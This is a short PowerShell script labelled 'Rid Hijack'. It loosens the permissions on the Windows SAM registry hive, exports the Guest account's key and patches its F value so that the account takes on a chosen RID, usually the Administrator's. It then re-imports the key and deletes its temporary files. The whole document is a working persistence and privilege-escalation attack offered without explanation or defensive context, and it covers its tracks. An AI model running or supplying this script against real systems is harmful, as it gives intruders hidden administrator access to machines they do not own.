write-host "Rid Hijack Start"
$inidata="HKEY_LOCAL_MACHINE\SAM [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5 [1 17]"
$inipath=$PWD.Path+"\a.ini"
[System.Io.File]::WriteAllText($inipath,$inidata)
write-host "Edit HKLM\SAM ACL"
regini $inipath
reg export 'HKLM\SAM\SAM\Domains\Account\Users\000001F5' .\export.reg /y
$calc=0
$rid="XXXXXXXXXXXX"
$rid_=""
for($x=0;$x -lt $rid.Length;$x++){
	$rid_+=$rid[$x]
	if($x%2 -eq 1){
		$rid_+=","
	}
}
$rid_=$rid_.TrimEnd(",")
$number=$rid.length/2-1
$path=$PWD.Path+"\export.reg"
$data=(Get-Content $path -TotalCount 7)[-2]
$datas=$data -split ","
$yuan=[System.String]::Join(",",$datas[0..$number])
$xg=$data -replace $yuan,"  $rid_"
$filecontent=[System.IO.File]::ReadAllText($path)
$xg2=$filecontent.Replace($data,$xg)
[System.Io.File]::WriteAllText($path,$xg2)
reg import .\export.reg
write-host "Rid Hijack Sucess"
Remove-Item $inipath
Remove-Item $path